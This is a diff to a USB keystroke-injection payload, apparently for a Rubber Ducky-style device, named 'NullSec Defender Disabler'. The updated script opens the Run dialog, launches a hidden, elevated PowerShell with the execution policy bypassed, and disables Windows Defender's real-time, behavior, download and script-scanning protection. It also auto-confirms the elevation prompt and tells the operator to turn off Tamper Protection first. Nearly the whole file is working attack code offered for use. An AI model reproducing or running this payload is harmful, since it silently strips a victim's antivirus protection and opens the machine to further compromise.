@@ -1,8 +1,16 @@
-REM NullSec Defender Disabler
+REM NullSec Defender Disabler v2.0
 REM Disables Windows Defender
+REM
+REM IMPORTANT: Disable Tamper Protection first!
+REM Windows Security > Virus & threat protection
+REM > Manage settings > Tamper Protection > Off
 
 DELAY 1000
 GUI r
+DELAY 700
+STRING powershell -ExecutionPolicy Bypass -Command "Start-Process powershell -Verb RunAs -ArgumentList '-w hidden -c `"try{Set-MpPreference -DisableRealtimeMonitoring `$true -ErrorAction Stop; Set-MpPreference -DisableBehaviorMonitoring `$true; Set-MpPreference -DisableIOAVProtection `$true; Set-MpPreference -DisableScriptScanning `$true}catch{Write-Host TAMPER_PROTECTION_BLOCKED}`"'"
+ENTER
+DELAY 3000
+ALT y
 DELAY 500
-STRING powershell -ExecutionPolicy Bypass -Command "Start-Process powershell -Verb RunAs -ArgumentList '-w hidden -c `"Set-MpPreference -DisableRealtimeMonitoring \$true; Set-MpPreference -DisableBehaviorMonitoring \$true; Set-MpPreference -DisableIOAVProtection \$true`"'"
 ENTER
